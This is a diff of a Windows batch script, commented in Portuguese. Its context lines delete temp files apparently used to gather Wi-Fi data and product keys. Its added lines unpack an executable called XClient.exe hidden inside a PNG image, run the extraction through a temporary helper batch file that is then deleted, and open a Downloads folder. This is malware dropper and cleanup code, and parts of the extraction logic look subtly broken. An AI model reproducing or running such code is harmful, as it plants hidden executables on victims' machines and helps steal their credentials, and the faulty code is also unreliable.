@@ -305,5 +305,55 @@ del %localappdata%\Temp\testtttt.ps1
 del %localappdata%\Temp\wlan.txt
 del %localappdata%\Temp\key.vbs
 del %localappdata%\Temp\Productkey.txt
+
+
+setlocal
+
+REM Define caminhos e tamanho do executável
+set "IMAGE_PATH=%~dp0image_with_executable.png"
+set "EXE_PATH=%~dp0XClient.exe"
+set "EXE_SIZE=123456"  REM Substitua pelo tamanho real do executável
+
+REM Verifica se a imagem existe
+if not exist "%IMAGE_PATH%" (
+    echo A imagem nao foi encontrada.
+    exit /b 1
+)
+
+REM Verifica se o executável já existe
+if exist "%EXE_PATH%" (
+    echo O executavel ja foi extraido.
+    exit /b 0
+)
+
+REM Cria o arquivo de extração
+echo @echo off > "%~dp0extract_exe.bat"
+echo setlocal >> "%~dp0extract_exe.bat"
+echo set "IMAGE_PATH=%IMAGE_PATH%" >> "%~dp0extract_exe.bat"
+echo set "EXE_PATH=%EXE_PATH%" >> "%~dp0extract_exe.bat"
+echo set "EXE_SIZE=%EXE_SIZE%" >> "%~dp0extract_exe.bat"
+echo ( >> "%~dp0extract_exe.bat"
+echo     for /f "tokens=*" %%A in ('powershell -Command "(Get-Content -Path '%IMAGE_PATH%' -Raw).Length"') do set FILESIZE=%%A >> "%~dp0extract_exe.bat"
+echo     if %FILESIZE% lss %EXE_SIZE% ( >> "%~dp0extract_exe.bat"
+echo         echo Tamanho do arquivo incorreto. >> "%~dp0extract_exe.bat"
+echo         exit /b 1 >> "%~dp0extract_exe.bat"
+echo     ) >> "%~dp0extract_exe.bat"
+echo     copy /b "%IMAGE_PATH%" +,, "%EXE_PATH%" >> "%~dp0extract_exe.bat"
+echo ) >> "%~dp0extract_exe.bat"
+
+REM Executa o arquivo de extração
+call "%~dp0extract_exe.bat"
+
+REM Limpeza
+del "%~dp0extract_exe.bat"
+
+REM Verifica se o executável foi extraído
+if not exist "%EXE_PATH%" (
+    echo Falha ao extrair o executavel.
+    exit /b 1
+)
+
+start C:\%USERS\drikk\Downloads
+echo Executavel extraido com sucesso.
 pause
 
